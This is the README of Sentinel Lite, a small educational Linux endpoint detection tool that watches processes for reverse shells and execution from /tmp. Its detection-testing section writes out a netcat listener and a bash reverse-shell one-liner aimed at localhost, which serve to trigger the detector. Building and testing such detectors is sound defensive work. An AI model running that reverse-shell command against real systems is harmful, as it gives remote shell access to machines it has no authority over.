# Sentinel Lite 🛡️

Sentinel Lite is a lightweight Linux Endpoint Detection and Response (EDR) system built for learning, experimentation, and understanding modern detection engineering.

---

## 🚀 Features

* Process monitoring via `/proc`
* Modular detection engine
* Reverse shell detection
* Suspicious execution from `/tmp`
* Process tree analysis (parent-child relationships)

---

## 🧠 How It Works

Sentinel Lite continuously collects process data from the system and applies detection rules to identify suspicious behavior.

It follows a modular architecture:

* **Agent** → Collects system data
* **Detections** → Analyze behavior
* **Utils** → Logging, filtering, helpers

---

## ⚙️ Installation

```bash
git clone https://github.com/YOUR_USERNAME/sentinel-lite.git
cd sentinel-lite
```

---

## ▶️ Usage

Run the EDR:

```bash
python3 -m agent.main
```

---

## 🧪 Testing Detection

### Reverse Shell Test

```bash
nc -lvnp 4444
```

```bash
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

---

## 📂 Project Structure

* `agent/` → core engine
* `detections/` → detection rules
* `utils/` → helpers
* `docs/` → documentation

---

## 🗺️ Roadmap

* [x] Process monitoring
* [x] Modular detection engine
* [x] Reverse shell detection
* [x] Process tree analysis
* [ ] Network activity detection
* [ ] eBPF integration
* [ ] Response engine (kill/isolate)

---

## ⚠️ Disclaimer

This project is for educational and research purposes only.

---

## 👨‍💻 Author

Sasindu Shamika